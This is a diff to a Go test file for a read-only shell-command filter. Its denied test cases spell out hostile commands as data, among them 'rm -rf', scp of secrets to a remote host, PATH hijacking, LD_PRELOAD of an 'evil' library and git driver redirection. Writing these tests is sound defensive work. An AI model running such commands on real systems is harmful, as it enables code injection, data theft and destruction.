@@ -42,8 +42,11 @@ func TestIsSafeReadOnly_Allowed(t *testing.T) {
 		{"git branch --merged", "git branch --merged main"},
 		{"git tag --points-at", "git tag --points-at HEAD"},
 		{"git tag --contains", "git tag --contains abc123"},
-		{"git remote show", "git remote show origin"},
+		// -n keeps `git remote show` off the network; without it the
+		// subcommand queries the remote, so it is denied below.
+		{"git remote show with -n", "git remote show -n origin"},
 		{"git remote get-url", "git remote get-url origin"},
+		{"hostname read-only flag", "hostname -f"},
 		{"multiple safe statements on separate lines", "ls\npwd"},
 		// A sequence of read-only statements is itself read-only, and a
 		// newline and a semicolon are the same thing to the parser.
@@ -93,6 +96,29 @@ func TestIsSafeReadOnly_Denied(t *testing.T) {
 		{"nice running an unsafe command", "nice rm -rf /tmp/pwned"},
 		{"time running an unsafe command", "time rm -rf /tmp/pwned"},
 		{"env with assignment then unsafe", "env SOMEVAR=x scp ./secrets host:/tmp"},
+
+		// An assignment through `env` is the same environment steering
+		// that safeStmt rejects for the `FOO=bar cmd` prefix form, so it
+		// has to fail the same way even when the inner command is safe.
+		{"env assignment before safe command", "env FOO=bar ls"},
+		{"env hijacking PATH", "env PATH=/tmp/evil ls"},
+		{"env preloading a library", "env LD_PRELOAD=/tmp/evil.so ls"},
+		{"env setting an external diff driver", "env GIT_EXTERNAL_DIFF=/tmp/evil git diff"},
+		{"env redirecting git config", "env GIT_CONFIG_GLOBAL=/tmp/evil git status"},
+		{"assignment through a nested wrapper", "nice -n 5 env PATH=/tmp/evil ls"},
+
+		// Short flags carry their value attached and cluster, so neither
+		// spelling is equal to the denied "-s".
+		{"date setting the clock", "date -s 2020-01-01"},
+		{"date setting the clock, attached value", "date -s2020-01-01"},
+		{"date setting the clock, clustered", "date -us 2020-01-01"},
+		{"hostname setting from a file", "hostname -F/tmp/evil"},
+		{"hostname setting via operand", "hostname myhost"},
+
+		// The remote is queried over the network without -n.
+		{"git remote show without -n", "git remote show origin"},
+		{"git textconv driver", "git diff --textconv"},
+		{"git textconv driver on show", "git show --textconv HEAD"},
 
 		// Mutating git forms that used to slip through on the "-" rule.
 		{"git branch delete", "git branch -D main"},
@@ -169,8 +195,10 @@ func TestPeelWrapper(t *testing.T) {
 		{"timeout with value flag", []string{"timeout", "-s", "TERM", "5", "ls"}, []string{"ls"}, true},
 		{"timeout with equals flag", []string{"timeout", "--signal=TERM", "5", "ls"}, []string{"ls"}, true},
 		{"nice with adjustment", []string{"nice", "-n", "10", "ls"}, []string{"ls"}, true},
-		{"env with assignment", []string{"env", "FOO=bar", "ls"}, []string{"ls"}, true},
-		{"env with multiple assignments", []string{"env", "A=1", "B=2", "ls", "-l"}, []string{"ls", "-l"}, true},
+		// Assignments are not skipped: the assignment stays at the head of
+		// the inner argv, where it matches no entry and so fails closed.
+		{"env with assignment", []string{"env", "FOO=bar", "ls"}, []string{"FOO=bar", "ls"}, true},
+		{"env with multiple assignments", []string{"env", "A=1", "B=2", "ls", "-l"}, []string{"A=1", "B=2", "ls", "-l"}, true},
 		{"env alone is not wrapping", []string{"env"}, nil, false},
 		{"env with only flags is not wrapping", []string{"env", "-i"}, nil, false},
 		{"double dash", []string{"nohup", "--", "ls"}, []string{"ls"}, true},
@@ -197,15 +225,21 @@ func TestIsSafeReadOnly_WrapperDepth(t *testing.T) {
 	assert.False(t, isSafeReadOnly("nohup nohup nohup nohup nohup ls"), "beyond the bound should fail closed")
 }
 
-func TestIsAssignment(t *testing.T) {
+// TestFlagDenied covers the spellings a short flag can take. getopt lets
+// a short flag carry its value attached and lets short flags cluster, so
+// matching the whole token against the deny set is not enough.
+func TestFlagDenied(t *testing.T) {
 	t.Parallel()
 
-	assert.True(t, isAssignment("FOO=bar"))
-	assert.True(t, isAssignment("_x=1"))
-	assert.True(t, isAssignment("A1=x"))
-	assert.True(t, isAssignment("FOO="))
-	assert.False(t, isAssignment("1FOO=x"), "a name cannot start with a digit")
-	assert.False(t, isAssignment("=bar"))
-	assert.False(t, isAssignment("ls"))
-	assert.False(t, isAssignment("--flag"))
+	deny := []string{"-s", "--set", "--output"}
+
+	assert.True(t, flagDenied("-s", deny))
+	assert.True(t, flagDenied("-s2020-01-01", deny), "attached value")
+	assert.True(t, flagDenied("-us", deny), "clustered with an allowed flag")
+	assert.True(t, flagDenied("--set", deny))
+	assert.True(t, flagDenied("--output=/tmp/x", deny), "long flag with =value")
+
+	assert.False(t, flagDenied("-u", deny))
+	assert.False(t, flagDenied("--utc", deny), "a long flag is not read character by character")
+	assert.False(t, flagDenied("--iso-8601=seconds", deny))
 }
